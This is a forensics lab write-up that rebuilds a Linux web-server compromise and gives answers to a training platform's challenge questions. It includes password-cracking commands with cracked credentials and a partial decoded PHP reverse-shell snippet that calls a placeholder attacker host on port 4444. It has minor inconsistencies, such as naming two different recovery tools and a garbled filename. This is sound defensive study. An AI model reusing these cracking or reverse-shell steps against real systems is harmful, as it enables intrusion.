# 🔴 Hacked Lab — Write-up
> **Linux Endpoint Forensics** · CyberDefenders · Medium · ⭐ 4.5/5 · 19/19 Solved
`Link Lab` : [CyberDefenders - Hacked Challenge](https://cyberdefenders.org/blueteam-ctf-challenges/hacked/)
---

## 📋 Overview

This lab focuses on **Linux endpoint forensics** by analyzing an E01 disk image of a compromised web server.

**Objective:** Reconstruct the attacker's full intrusion lifecycle — initial access, credential theft, privilege escalation, persistence, and reverse shell deployment — through systematic examination of filesystem artifacts, system logs, password files, and recovered deleted content.

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `FTK Imager` | Disk image mounting & filesystem navigation |
| `R-Studio` | Deleted file recovery |
| `last` | Login session analysis from `wtmp` |
| `unshadow` | Merge passwd + shadow for cracking |
| `John the Ripper` | Password hash cracking |
| `RockYou wordlist` | Dictionary for brute-force cracking |

---

## 💽 Disk Image Structure (Webserver.E01)

Opening `Webserver.E01` in **FTK Imager** reveals the disk is divided into **3 main partitions** plus one unpartitioned area:

```
Webserver.E01
├── /dev/sda1          [243MB]
├── VulnOSv2-vg-swap_1 [768MB]
├── VulnOSv2-vg-root   [31244MB]
└── Unpartitioned Space [LVM2]
```

### 📁 `/dev/sda1` — Boot Partition (243MB)

| Property | Details |
|----------|---------|
| Size | 243 MB |
| Filesystem | `ext2` / `ext4` |
| Mount point | `/boot` |

**Contents:**
- **Bootloader** (`GRUB`) — responsible for loading the OS at startup
- **Linux kernel** (`vmlinuz-x.x.x`) — the core of the operating system
- **Initial RAM disk** (`initrd.img`) — a temporary filesystem used during the boot process
- **GRUB config** (`/boot/grub/grub.cfg`)

> 💡 The `/boot` partition is kept separate so the bootloader can access it even when the rest of the disk is encrypted (LVM/LUKS). This is the only partition that sits **outside the LVM volume group**.

---

### 🔄 `VulnOSv2-vg-swap_1` — Swap Partition (768MB)

| Property | Details |
|----------|---------|
| Size | 768 MB |
| Filesystem | `swap` (no conventional filesystem) |
| Mount point | None (used directly by the kernel) |

**Contents:**
- **Virtual memory overflow** — when RAM is full, the kernel pages out less-used memory blocks here
- **Hibernate data** — stores the full RAM state when the system hibernates

**Forensic value:**
- May contain **fragments of sensitive in-memory data**: passwords, encryption keys, session tokens, and plaintext from previously running processes
- Tools like `strings` or `bulk_extractor` can surface recoverable data from this area

> ⚠️ Swap is often overlooked during investigations, but it can hold highly valuable artifacts — particularly memory remnants from attacker processes that were running during the intrusion.

---

### 🖥️ `VulnOSv2-vg-root` — Root Partition (31244MB)

| Property | Details |
|----------|---------|
| Size | ~30.5 GB |
| Filesystem | `ext4` |
| Mount point | `/` (root filesystem) |
| Volume Group | `VulnOSv2-vg` (LVM) |

**Contains the entire operating system:**

```
/
├── etc/        ← passwd, shadow, group, timezone, sudoers
├── var/
│   ├── log/    ← auth.log, wtmp, lastlog, apache2/access.log
│   ├── www/    ← Drupal web root
│   └── mail/   ← mail user home + bash_history
├── root/       ← root bash_history, downloaded exploit
├── usr/
│   └── php/    ← home directory of attacker's backdoor account
├── tmp/        ← location where 37292.c was downloaded and executed
└── home/       ← home directories for standard users
```

**This is the most forensically significant partition** — it contains every artifact analyzed in this lab:
- System logs
- Password files
- Bash histories
- Web server files
- Deleted exploit file (recovered with R-Studio)

> 💡 `VulnOSv2-vg` is the **Volume Group** name under LVM (Logical Volume Manager). LVM provides flexible disk management — logical volumes can be resized or snapshotted without reformatting. The `vg` prefix is the standard LVM naming convention for volume groups.

---

### 🗂️ Unpartitioned Space (LVM2 metadata)

This is not a real partition — it is the **LVM2 metadata area**, which stores the configuration data for the Volume Group (`VulnOSv2-vg`), including the mapping between Physical Volumes and Logical Volumes.

---

## 🧭 Attack Chain Summary

```
[1] Brute-force SSH ──► [2] Credential Access (mail:forensics)
        │
        ▼
[3] SSH Login ──► [4] sudo su - (Privilege Escalation to root)
        │
        ▼
[5] Create backdoor user (php) ──► [6] Add to sudo group
        │
        ▼
[7] Download & run exploit (37292.c) ──► [8] Delete exploit to cover tracks
        │
        ▼
[9] Exploit Drupal 7.26 (CVE / web RCE) ──► [10] Reverse Shell → port 4444
```

---

## 🔍 Questions & Findings

---

### Q1 · What is the system timezone?

**Answer: `Europe/Brussels`**

The system timezone is stored as plain text in `/etc/timezone`. After mounting the disk image in FTK Imager, we navigated directly to this file.

![image](https://hackmd.io/_uploads/HJ6XC0mq-g.png)



The value was consistent with all log timestamps observed throughout the investigation.

---

### Q2 · Who was the last user to log in to the system?

**Answer: `mail`**

To identify the last user who logged into the system, we opened the disk image in FTK Imager and directly examined the file `/var/log/auth.log`. By reviewing the log entries from the bottom, we found the most recent successful authentication:

![image](https://hackmd.io/_uploads/ry55kJE5Ze.png)


```csharp
"Oct 5 13:23:34 VulnOSv2 sshd[3108]: Accepted password for mail from 192.168.210.131 port 57708 ssh2"
```


This confirms that the user mail was the last one to log in via SSH before the session was closed.
image

---

### Q3 · What was the source port the user 'mail' connected from?

**Answer: `57708`**

In `/var/log/auth.log`, filtering for the `Accepted password for mail` event reveals the full connection details including the ephemeral source port.

![image](https://hackmd.io/_uploads/HkdAkkEc-g.png)



---

### Q4 · How long was the last session for user 'mail'? (Minutes only)

**Answer: `1`**

The session start and end timestamps from `auth.log` show:

![image](https://hackmd.io/_uploads/Sk_fgy49We.png)


```
Start : Oct 5 13:23:34
End   : Oct 5 13:24:11
────────────────────────
Duration: ~40 seconds → rounds to 1 minute
```

This is a very short session, indicating a targeted and scripted intrusion.

---

### Q5 · Which server service did the last user use to log in?

**Answer: `sshd`**

The `auth.log` entry explicitly references the SSH daemon (`sshd`) as the service processing the login:

![image](https://hackmd.io/_uploads/BJSUgJV5-x.png)


```
sshd[...]: Accepted password for mail from ... port 57708 ssh2
```

---

### Q6 · What type of authentication attack was performed?

**Answer: `brute-force`**

Examining `/var/log/auth.log` reveals thousands of sequential `Failed password for root` entries from multiple source IPs before the eventual successful login. This pattern — rapid, automated, repeated failed attempts — is the hallmark of a **brute-force** attack.

![image](https://hackmd.io/_uploads/r1l3xk4c-l.png)

---

### Q7 · How many IP addresses are listed in `/var/log/lastlog`?

**Answer: `2`**

The `lastlog` binary file records the most recent login per user. Reading it with the `lastlog` command and filtering for entries with actual login records (non-"Never logged in") reveals exactly **2** unique remote IP addresses.

![image](https://hackmd.io/_uploads/SkY1-yNcZe.png)


---

### Q8 · How many users have a login shell?

**Answer: `5`**

Parsing `/etc/passwd` and filtering for entries with real interactive shells (`/bin/bash`, `/bin/sh`) — excluding system accounts with `/sbin/nologin` or `/usr/sbin/nologin` — yields **5** users.

![image](https://hackmd.io/_uploads/HJZBzkV9Wg.png)

---

### Q9 · What is the password of the mail user?

**Answer: `forensics`**

We extracted `/etc/passwd` and `/etc/shadow`, merged them with `unshadow`, then cracked using John the Ripper against the RockYou wordlist:

```bash
unshadow /etc/passwd /etc/shadow > shadow
john --wordlist=/usr/share/wordlists/rockyou.txt shadow
john --show shadow

# mail:forensics:...
# php:forensics:...   ← attacker reused the same password
```

![image](https://hackmd.io/_uploads/HyapG1NcWl.png)


> 💡 Both `mail` and the attacker-created `php` account used the same password — suggesting the attacker copy-pasted credentials when creating their backdoor.

---

### Q10 · Which user account was created by the attacker?

**Answer: `php`**

Grepping `auth.log` for `useradd` reveals the attacker (as root) creating the `php` account and immediately adding it to the `sudo` group for persistent privileged access.

![image](https://hackmd.io/_uploads/SkmDmJNcZx.png)


No legitimate system service requires a user named `php`.

---

### Q11 · How many user groups exist on the machine?

**Answer: `58`**

Each line in `/etc/group` represents one group. A simple line count gives the total:

![image](https://hackmd.io/_uploads/SyC1E14cZx.png)


```bash
wc -l /etc/group
# 58 /etc/group
```

---

### Q12 · How many users have sudo access?

**Answer: `2`**

The `sudo` entry in `/etc/group` lists its members. Two users were found: the original `mail` user (unusual for a mail account — suggesting prior misconfiguration) and the attacker-created `php` account.
![image](https://hackmd.io/_uploads/S1q44JN9We.png)



---

### Q13 · What is the home directory of the PHP user?

**Answer: `/usr/php`**

The 6th field of the `/etc/passwd` entry for `php` defines its home directory:

![image](https://hackmd.io/_uploads/Hkoj4JEc-l.png)


Placing user home directories under `/usr/` is non-standard and suspicious — further confirming this is an attacker-created account.

---

### Q14 · What command did the attacker use to gain root privilege?

**Answer: `sudo su -`**

> ⚠️ Note: The answer contains **two spaces** — `sudo` `su` `-`

The `mail` user's bash history file contained the exact command used for privilege escalation:

```bash
cat /var/mail/.bash_history
# ...
# sudo su -
```
![image](https://hackmd.io/_uploads/BkTrrkEqbx.png)

This was also corroborated in `auth.log`:
![image](https://hackmd.io/_uploads/SJ7LB1V5-x.png)

```
sudo: mail : TTY=pts/0 ; USER=root ; COMMAND=/bin/su -
```

---

### Q15 · Which file did the user 'root' delete?

**Answer: `37292.c`**

Root's bash history (`/root/.bash_history`) clearly shows the attacker downloading, compiling, and executing a C exploit from `/tmp`, then removing it to cover their tracks:

```bash
cat /root/.bash_history
```
![image](https://hackmd.io/_uploads/BJy9Sy45Ze.png)


> 💡 **37292** is the Exploit-DB ID for a well-known local privilege escalation exploit (CVE-2015-1328 / overlayfs).

---

### Q16 · Recover the deleted file and extract the exploit author name.

**Answer: `Rebel`**

Deleted files are not immediately wiped — their data blocks remain on disk until overwritten. Using **Disk-Drill** to scan unallocated space on the mounted E01 image, we recovered `37292.c` 

![image](https://hackmd.io/_uploads/BykRS14qbe.png)



This is a known public exploit available on Exploit-DB, authored by **Rebel**.

---

### Q17 · What is the content management system (CMS) installed?

**Answer: `Drupal`**

Two independent sources confirm the CMS:

1. **APT history log** — `/var/log/apt/history.log` shows `drupal7` installed via package manager
2. **Web root structure** — `/var/www/html/` contains Drupal-specific directories (`modules/`, `themes/`, `sites/`) and the `CHANGELOG.txt` file

![image](https://hackmd.io/_uploads/H1uVLJE5Zg.png)

Drupal is a free and open-source Content Management System (CMS) written in PHP.

It is used to build and manage websites, such as:

- blogs
- company websites
- news portals
- e-commerce sites
- government websites

---

### Q18 · What is the version of the CMS installed?

**Answer: `7.26`**

The exact version is documented in Drupal's `bootstrap.ín` and confirmed in `/var/www/html/jabc/includes/bootstrap.inc`:

![image](https://hackmd.io/_uploads/H1yuPy45bl.png)


> ⚠️ **Drupal 7.26 is critically outdated.** This version is vulnerable to multiple public exploits including SQL injection (Drupalgeddon) and remote code execution vulnerabilities.

---

### Q19 · Which port was listening to receive the attacker's reverse shell?

**Answer: `4444`**

In `/var/log/apache2/access.log`, we located malicious HTTP `POST` requests from the attacker's IP containing base64-encoded payloads — a classic web shell delivery pattern.

```bash
grep "POST" /var/log/apache2/access.log | grep "base64"
```
![image](https://hackmd.io/_uploads/rJu2vkV9bl.png)

Decoding the payload with CyberChef (Base64 → Raw) revealed an obfuscated PHP reverse shell script with the callback port explicitly hardcoded:

```php
$ip   = 'ATTACKER_IP';
$port = 4444;          // ← attacker's listener port
$chunk_size = 1400;
...
```

Port `4444` is the default Metasploit multi/handler listener — further confirming this was a structured, tool-assisted attack.


```csharp
Attacker
   │
   │ exploit
   ▼
Drupal website
   │
   │ RCE
   ▼
reverse shell
   │
   │ connect
   ▼
192.168.210.131:4444
   │
   │ shell access
   ▼
www-data
   │
   │ privilege escalation
   ▼
mail (sudo)
   │
   ▼
root

```


---

## 📊 Skills Demonstrated

| Skill | Method |
|-------|--------|
| Disk image analysis | FTK Imager — filesystem navigation of E01 |
| Authentication log analysis | `auth.log`, `wtmp`, `lastlog` parsing |
| Password cracking | `unshadow` + `john` + RockYou wordlist |
| Deleted file recovery | R-Studio unallocated space scan |
| Privilege escalation reconstruction | Bash history correlation |
| CMS fingerprinting | APT logs + web root structure |
| Web exploit decoding | Apache access log + CyberChef base64 decode |
| Attack timeline correlation | Cross-referencing all artifact sources |

---

## 🏁 Conclusion

This investigation demonstrates how a layered forensic approach can fully reconstruct a server compromise from a single disk image.

**The attacker's full kill chain:**

1. **Reconnaissance & Initial Access** — Brute-forced SSH, cracking the weak password `forensics` for the `mail` account
2. **Privilege Escalation** — Used `sudo su -` to obtain root shell (mail was incorrectly in the sudo group)
3. **Persistence** — Created backdoor account `php` with sudo access; reused the same password
4. **Local PrivEsc (belt-and-suspenders)** — Downloaded and ran the `37292.c` overlayfs exploit, then deleted it
5. **Web Exploitation** — Leveraged the outdated Drupal 7.26 installation to deploy a PHP reverse shell via POST request
6. **Command & Control** — Established reverse shell callback to attacker machine on port `4444`

**Key takeaways:**

- Weak SSH passwords remain one of the most exploited attack vectors
- Unnecessary sudo privileges for service accounts create critical escalation paths
- Outdated CMS installations are prime targets for automated exploitation
- Deleted files are recoverable — attackers must overwrite (not just delete) to truly destroy evidence
- Bash history is a goldmine for forensic investigators — attackers often forget to clear it

---

*Write-up by: [Your Name] · Platform: CyberDefenders · Lab: Hacked Lab*
